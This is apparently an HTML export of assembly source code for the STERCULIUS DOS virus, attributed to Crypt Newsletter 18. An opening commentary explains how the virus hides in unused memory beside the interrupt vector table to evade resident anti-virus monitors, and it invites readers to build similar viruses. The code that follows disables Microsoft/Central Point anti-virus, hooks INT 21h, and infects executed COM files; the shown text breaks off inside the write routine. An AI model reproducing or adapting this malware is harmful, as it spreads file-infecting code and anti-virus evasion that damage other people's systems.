<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; comment $</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; STERCULIUS virus: copying a virus into the air in the interrupt</span><span class="sc0">
</span><span class="sc1">; vector table - for CRYPT NEWSLETTER 18.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; The STERCULIUS virus uses the 'hole' in DOS's memory that is</span><span class="sc0">
</span><span class="sc1">; found after the interrupt vector table located at 0000:0000 in memory.</span><span class="sc0">
</span><span class="sc1">; This hole in memory is unused much of the time and is filled with</span><span class="sc0">
</span><span class="sc1">; '00''s, or "air", starting at 0000:01E0.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Using the MS-DOS program DEBUG we can take a quick look at this</span><span class="sc0">
</span><span class="sc1">; empty space by typing the command:</span><span class="sc0">
</span><span class="sc1">;      </span><span class="sc0">
</span><span class="sc1">;      DEBUG</span><span class="sc0">
</span><span class="sc1">;      d 0000:01e0</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; And we see:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; 0000:01E0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................</span><span class="sc0">
</span><span class="sc1">; 0000:01F0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................</span><span class="sc0">
</span><span class="sc1">; 0000:0200  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................</span><span class="sc0">
</span><span class="sc1">; 0000:0210  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................</span><span class="sc0">
</span><span class="sc1">; 0000:0220  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................</span><span class="sc0">
</span><span class="sc1">; 0000:0230  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................</span><span class="sc0">
</span><span class="sc1">; 0000:0240  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................</span><span class="sc0">
</span><span class="sc1">; 0000:0250  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Not much of anything! </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; The LoveChild virus uses the same space and if it were present</span><span class="sc0">
</span><span class="sc1">; in memory (not likely, as it barely works under DOS 3.3),</span><span class="sc0">
</span><span class="sc1">; you'd see something like "v2 LoveChild in reward for software</span><span class="sc0">
</span><span class="sc1">; sealing [sic]" or some similar gibber in the above display.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Sterculius copies itself to segment:offset 0000:01E0 in memory, </span><span class="sc0">
</span><span class="sc1">; right next to the end of the data in the interrupt vector table,</span><span class="sc0">
</span><span class="sc1">; like LoveChild and if we fire up DEBUG again once the virus</span><span class="sc0">
</span><span class="sc1">; is in memory:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; 0000:01E0  E8 0A 00 53 54 45 52 43-55 4C 49 55 53 5E 83 EE   ...STERCULIUS^..</span><span class="sc0">
</span><span class="sc1">; 0000:01F0  03 56 FC 83 C6 55 90 BF-00 01 A5 A5 5E 33 C0 8E   .V...U......^3..</span><span class="sc0">
</span><span class="sc1">; 0000:0200  C0 BF E0 01 26 81 7D 03-53 54 74 1E B9 08 01 90   ....&amp;.}.STt.....</span><span class="sc0">
</span><span class="sc1">; 0000:0210  F3 A4 BE 84 00 8E D8 A5-A5 BF E0 01 83 C7 63 90   ..............c.</span><span class="sc0">
</span><span class="sc1">; 0000:0220  FA 89 7C FC 89 44 FE FB-0E 1F 0E 07 BE 00 01 56   ..|..D.........V</span><span class="sc0">
</span><span class="sc1">; 0000:0230  C3 E9 00 00 53 4D 5A 63-01 9C 2E FF 1E E8 02 C3   ....SMZc........</span><span class="sc0">
</span><span class="sc1">; 0000:0240  E9 A4 00 80 FC 4B 75 F8-50 53 51 52 1E 06 56 57   .....Ku.PSQR..VW</span><span class="sc0">
</span><span class="sc1">; 0000:0250  55 9C B8 00 43 E8 E1 FF-51 1E 52 33 C9 B8 01 43   U...C...Q.R3...C</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Four!</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Without the marker, "STERCULIUS," the virus would be difficult </span><span class="sc0">
</span><span class="sc1">; for the user to see in memory for a couple of reasons: </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; 1) Very few people actually know what system memory in the interrupt </span><span class="sc0">
</span><span class="sc1">;    table looks like normally,</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; 2) It is not a place any of the current memory spies tell you to look for </span><span class="sc0">
</span><span class="sc1">;    viruses.  </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; IF you scan up the rest of the table you will see the remainder of the </span><span class="sc0">
</span><span class="sc1">; virus and about once again as much free space left.  </span><span class="sc0">
</span><span class="sc1">; That means you can fit about a 300+ byte virus into this space, plenty </span><span class="sc0">
</span><span class="sc1">; of room for lots of extra code.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; If you look again at the DEBUG dump you will see "MZ" - </span><span class="sc0">
</span><span class="sc1">; that is DEBUG's EXEfile identifier - the first word Sterculius pulls off of </span><span class="sc0">
</span><span class="sc1">; any executed program to check if it's a suitable candidate for infection.  </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Sterculius stores the word and in the case of DEBUG, lets the program pass by.</span><span class="sc0">
</span><span class="sc1">; If a .COMfile had just been loaded, the original program's jump would </span><span class="sc0">
</span><span class="sc1">; be occupying that space.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Clear?  </span><span class="sc0">
</span><span class="sc1">; Now you can follow this example to make memory resident viruses that occupy</span><span class="sc0">
</span><span class="sc1">; that 'hole' in memory next to the  interrupt vector table.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Viruses using this method of residence aren't detected by </span><span class="sc0">
</span><span class="sc1">; 98% of the anti-virus guards - or virus filters - specifically designed </span><span class="sc0">
</span><span class="sc1">; to detect programs which go resident. This is odd, since the technique </span><span class="sc0">
</span><span class="sc1">; isn't particularly new.  However, one or two anti-virus manufacturers</span><span class="sc0">
</span><span class="sc1">; have taken steps in this direction, coding their memory filters so</span><span class="sc0">
</span><span class="sc1">; that some of their code occupies the same general area that a virus</span><span class="sc0">
</span><span class="sc1">; like STERCULIUS might use.  Then again, these developers have to</span><span class="sc0">
</span><span class="sc1">; deal with users who may have memory management drivers which muck</span><span class="sc0">
</span><span class="sc1">; about in the same space.  You see, there are always trade-offs</span><span class="sc0">
</span><span class="sc1">; in this kind of work.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Try STERCULIUS with Central Point, Microsoft Anti-virus, something dumb </span><span class="sc0">
</span><span class="sc1">; like INVIRCBLE, or just about any TYPICAL resident monitor.  </span><span class="sc0">
</span><span class="sc1">; STERCULIUS also contains the "casual" anti-anti-virus measure, VSLAY,</span><span class="sc0">
</span><span class="sc1">; which will under optimum conditions, deinstall the Microsoft Anti-virus</span><span class="sc0">
</span><span class="sc1">; resident filter.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Interesting!  </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Many lazy people have grown fond of McAfee Associates PROVIEW, too.  </span><span class="sc0">
</span><span class="sc1">; It's good for checking up on viruses in memory because it puts a </span><span class="sc0">
</span><span class="sc1">; big &lt;UNKNOWN&gt; message on the screen when a virus is taking up space at </span><span class="sc0">
</span><span class="sc1">; the top of conventional RAM.  </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; You won't see STERCULIUS using this technique, nor will a look at where </span><span class="sc0">
</span><span class="sc1">; INT 21 is pointing under PROVIEW tell the dilettante much.  </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Proview will show you the interrupt is still pointing into the table, where </span><span class="sc0">
</span><span class="sc1">; it belongs.  </span><span class="sc0">
</span><span class="sc1">; You'll have to look close to see that the original address has changed!</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; STERCULIUS has been tested under QEMM 7.0 and QEMM 6.0 but there is</span><span class="sc0">
</span><span class="sc1">; always the probability that it will crash on other multi-tasking systems </span><span class="sc0">
</span><span class="sc1">; which use other memory managers. </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Often, you see, they use the space where STERCULIUS resides.  </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; If this is the case, they system will hang when STERCULIUS invades it.  </span><span class="sc0">
</span><span class="sc1">; You can alter this behavior by looking at the interrupt vector table on your </span><span class="sc0">
</span><span class="sc1">; system and altering where STERCULIUS copies itself into memory by moving </span><span class="sc0">
</span><span class="sc1">; the virus up in RAM.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Also, this method of residency has an indirect benefit.  </span><span class="sc0">
</span><span class="sc1">; STERCULIUS can't be properly DEBUGGED by ZD86 because they conflict</span><span class="sc0">
</span><span class="sc1">; over the same memory space.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; STERCULIUS infects COMMAND.COM quite easily and doesn't interfere</span><span class="sc0">
</span><span class="sc1">; with boot up.  However, since COMMAND.COM overwrites the space</span><span class="sc0">
</span><span class="sc1">; STERCULIUS is using at boot time, the virus is expunged from memory</span><span class="sc0">
</span><span class="sc1">; on completion of system installation.  Shelling anytime thereafter</span><span class="sc0">
</span><span class="sc1">; reinstalls the virus. Reloading the transient portion of COMMAND.COM</span><span class="sc0">
</span><span class="sc1">; doesn't interfere with the virus either.</span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; $</span><span class="sc0">

</span><span class="sc1">;**************************************</span><span class="sc0">
</span><span class="sc1">;            STERCULIUS VIRUS</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; AUTHORS: K”hntark / Urnst Kouch</span><span class="sc0">
</span><span class="sc1">; DATE:    SEPTEMBER 1993</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;**************************************</span><span class="sc0">

</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">tiny</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">
        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">

</span><span class="sc5">START</span><span class="sc4">:</span><span class="sc0">                                                 
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0E9h</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc4">,</span><span class="sc12">'S'</span><span class="sc0">   </span><span class="sc1">;Jump to Virus_Entry</span><span class="sc0">

</span><span class="sc5">FAKE_HOST</span><span class="sc4">:</span><span class="sc0">                                
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">20h</span><span class="sc0">              </span><span class="sc1">;host file terminate</span><span class="sc0">


</span><span class="sc5">VIRUS_ENTRY</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">INITIALIZE</span><span class="sc0">

</span><span class="sc5">ID</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'STERCULIUS'</span><span class="sc0">      </span><span class="sc1">;The Roman god of feces</span><span class="sc0">
                      </span><span class="sc1">;intellectual property of Mike</span><span class="sc0">
</span><span class="sc5">INITIALIZE</span><span class="sc4">:</span><span class="sc0">                               </span><span class="sc1">;Judge, sort of, and if this</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">                </span><span class="sc1">;means nothing to you, then you're</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">              </span><span class="sc1">;not paying attention</span><span class="sc0">

</span><span class="sc1">;*****************                </span><span class="sc0">
</span><span class="sc1">; Restore host</span><span class="sc0">
</span><span class="sc1">;*****************</span><span class="sc0">
        
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">HOST_STUB</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">VIRUS_ENTRY</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">

</span><span class="sc1">;***************************                </span><span class="sc0">
</span><span class="sc1">; Remove MSAV / CPAV VSAFE    ;&lt;---VSLAY, Crypt Newsletter 15 [ref]</span><span class="sc0">
</span><span class="sc1">;***************************</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">5945h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0FA01h</span><span class="sc0">    </span><span class="sc1">;AL=01 very important!</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">  </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc1">;***************************                </span><span class="sc0">
</span><span class="sc1">; Check if already resident</span><span class="sc0">
</span><span class="sc1">;***************************</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">  
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">01E0h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">'TS'</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">EXIT</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">ZIZE</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">           </span><span class="sc1">;move virus to 0000:01E0 from ds:si</span><span class="sc0">
        
</span><span class="sc1">;***********************                </span><span class="sc0">
</span><span class="sc1">; Mov INT 21 address</span><span class="sc0">
</span><span class="sc1">;***********************</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">        </span><span class="sc1">;ds=0</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">                </span><span class="sc1">;from ds:si to es:di</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0"> 
        
</span><span class="sc1">;***********************                </span><span class="sc0">
</span><span class="sc1">;  Hook INT 21</span><span class="sc0">
</span><span class="sc1">;***********************</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">01E0h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">INT_21_HANDLER</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">VIRUS_ENTRY</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">                           </span><span class="sc1">;disable interrupts</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">  </span><span class="sc1">;address of INT 21 handler</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">  
        </span><span class="sc6">sti</span><span class="sc0">                           </span><span class="sc1">;enable interrupts  </span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc5">EXIT</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">         
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
           </span><span class="sc1">;push    0100h       ;386 code left out</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">;return to host</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">NEW_HOST_ENTRY</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0E9h</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc4">,</span><span class="sc12">'S'</span><span class="sc0">

</span><span class="sc5">HOST_STUB</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">090h</span><span class="sc4">,</span><span class="sc2">090h</span><span class="sc4">,</span><span class="sc2">090h</span><span class="sc4">,</span><span class="sc2">090h</span><span class="sc0"> </span><span class="sc1">;nops</span><span class="sc0">

</span><span class="sc5">INT_21</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">  
        </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">REALL_INT_21</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
         
</span><span class="sc5">QUICK_EXIT</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">QUICK_OUT</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">INT_21_HANDLER</span><span class="sc4">:</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Bh</span><span class="sc0">           </span><span class="sc1">;execute a file?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">QUICK_EXIT</span><span class="sc0">       </span><span class="sc1">;quick exit handler</span><span class="sc0">
         
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
         </span><span class="sc6">pushf</span><span class="sc0">

</span><span class="sc1">;***********************                </span><span class="sc0">
</span><span class="sc1">;  Save Attributes</span><span class="sc0">
</span><span class="sc1">;***********************</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">INT_21</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">SKIP</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">         </span><span class="sc1">;save attributes to stack</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">         </span><span class="sc1">;ds:dx = pathname to file</span><span class="sc0">


</span><span class="sc1">;***********************                </span><span class="sc0">
</span><span class="sc1">;  Klear Attributes</span><span class="sc0">
</span><span class="sc1">;***********************</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">INT_21</span><span class="sc0">
</span><span class="sc5">SKIP</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">RESTORE_ATTRIBUTES</span><span class="sc0">

</span><span class="sc1">;***********************                </span><span class="sc0">
</span><span class="sc1">;  Open File</span><span class="sc0">
</span><span class="sc1">;***********************</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D02h</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">INT_21</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">RESTORE_ATTRIBUTES</span><span class="sc0">
         </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">         </span><span class="sc1">;file handle to bx</span><span class="sc0">

</span><span class="sc1">;***********************                </span><span class="sc0">
</span><span class="sc1">;  Save Date &amp; time</span><span class="sc0">
</span><span class="sc1">;***********************</span><span class="sc0">
         
         </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">INT_21</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc0">              </span><span class="sc1">;save date</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc0">              </span><span class="sc1">;save time</span><span class="sc0">

</span><span class="sc1">;***********************                </span><span class="sc0">
</span><span class="sc1">;  Read 4 bytes</span><span class="sc0">
</span><span class="sc1">;***********************</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">04</span><span class="sc0">                </span><span class="sc1">;# of bytes to read</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">HOST_STUBB</span><span class="sc0">        </span><span class="sc1">;buffer to read 4 bytes to</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0"> 
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                   </span><span class="sc1">;ds=cs</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">INT_21</span><span class="sc0">               </span><span class="sc1">;read to ds:dx</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">CLOSE_FILE</span><span class="sc0">

</span><span class="sc1">;***********************                </span><span class="sc0">
</span><span class="sc1">;  Check File</span><span class="sc0">
</span><span class="sc1">;***********************</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">     </span><span class="sc1">;EXE file?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">CLOSE_FILE</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">'S'</span><span class="sc0">  </span><span class="sc1">;infected COM file?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">CLOSE_FILE</span><span class="sc0">
        
</span><span class="sc1">;***********************                </span><span class="sc0">
</span><span class="sc1">;  File PTR @EOF</span><span class="sc0">
</span><span class="sc1">;***********************</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">cwd</span><span class="sc0">               </span><span class="sc1">;cx = dx = 00</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">INT_21</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">     </span><span class="sc1">;fix file size </span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">;address to jump to</span><span class="sc0">
        
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">ZIZE</span><span class="sc0">       </span><span class="sc1">;file + VIRUS SIZE &gt; 64K?</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">CLOSE_FILE</span><span class="sc0">    </span><span class="sc1">;exit if so</span><span class="sc0">

</span><span class="sc1">;***********************                </span><span class="sc0">
</span><span class="sc1">;  Write Virus</span><span class="sc0">
</span><span class="sc1">;***********************</span><span class="sc0">

           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">ZIZE</span><span class="sc0">    </span><span class="sc1">;cx = #of bytes</span><span class="sc0">
